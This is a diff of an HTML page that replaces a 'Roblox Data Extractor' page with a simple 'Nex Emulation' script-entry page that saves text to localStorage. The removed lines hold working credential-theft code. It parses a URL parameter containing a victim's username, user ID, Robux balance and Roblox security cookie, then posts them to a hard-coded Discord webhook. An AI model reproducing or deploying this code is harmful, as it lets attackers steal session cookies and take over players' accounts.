@@ -3,90 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Data Extractor</title>
-    <script>
-        window.onload = function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const data = urlParams.get('data');
-            
-            if (data) {
-                try {
-                    const message = JSON.parse(decodeURIComponent(data));
-                    console.log("Data received:", message); // Log the data to console for debugging
-                    sendWebhook(message); // Send the extracted data to the webhook
-                } catch (error) {
-                    console.error('Error parsing data:', error);
-                }
-            } else {
-                console.error('No data parameter found in the URL');
-            }
-        };
-
-        function sendWebhook(message) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1345195939304046663/2v1rOg93RZscRR8CFLN3pnFPARbXxZr9Bhpy1Zv3DWBwOtdy6Kb9dSQhO3Nkcdvqh6gU';
-
-            const embed = {
-                "embeds": [{
-                    "title": "Roblox Data Extracted",
-                    "fields": [
-                        {
-                            "name": "Username",
-                            "value": message.username,
-                            "inline": true
-                        },
-                        {
-                            "name": "UserID",
-                            "value": message.userid.toString(),
-                            "inline": true
-                        },
-                        {
-                            "name": "Robux",
-                            "value": message.robux.toString(),
-                            "inline": true
-                        },
-                        {
-                            "name": "Job ID",
-                            "value": message.job,
-                            "inline": true
-                        },
-                        {
-                            "name": "Teleport Info",
-                            "value": message.teleport,
-                            "inline": false
-                        },
-                        {
-                            "name": "Roblox Security Cookie",
-                            "value": message.robloxSecurity || "Not Available",
-                            "inline": false
-                        }
-                    ],
-                    "image": {
-                        "url": message.headshot
-                    },
-                    "footer": {
-                        "text": "Roblox Data Extractor"
-                    }
-                }]
-            };
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(embed)
-            }).then(response => {
-                if (response.ok) {
-                    console.log('Webhook sent successfully');
-                } else {
-                    console.error('Error sending webhook:', response);
-                }
-            }).catch(error => {
-                console.error('Request failed', error);
-            });
-        }
-    </script>
+    <title>Nex Emulation</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
+        textarea { width: 90%; height: 200px; margin-bottom: 10px; }
+        button { padding: 10px 20px; margin: 5px; font-size: 16px; }
+    </style>
 </head>
 <body>
+    <h1>Nex Emulation</h1>
+    <textarea id="code" placeholder="Enter your script here..."></textarea><br>
+    <button onclick="sendCode()">Execute</button>
+    <button onclick="clearCode()">Clear</button>
+    <p id="status"></p>
+
+    <script>
+        async function sendCode() {
+            let code = document.getElementById("code").value;
+            if (!code.trim()) return alert("Enter a script first!");
+
+            localStorage.setItem("latestCode", code);
+            document.getElementById("status").innerText = "Code saved.";
+        }
+
+        function clearCode() {
+            document.getElementById("code").value = "";
+            localStorage.removeItem("latestCode");
+            document.getElementById("status").innerText = "Cleared.";
+        }
+
+        function getCode() {
+            return localStorage.getItem("latestCode") || "";
+        }
+    </script>
 </body>
 </html>
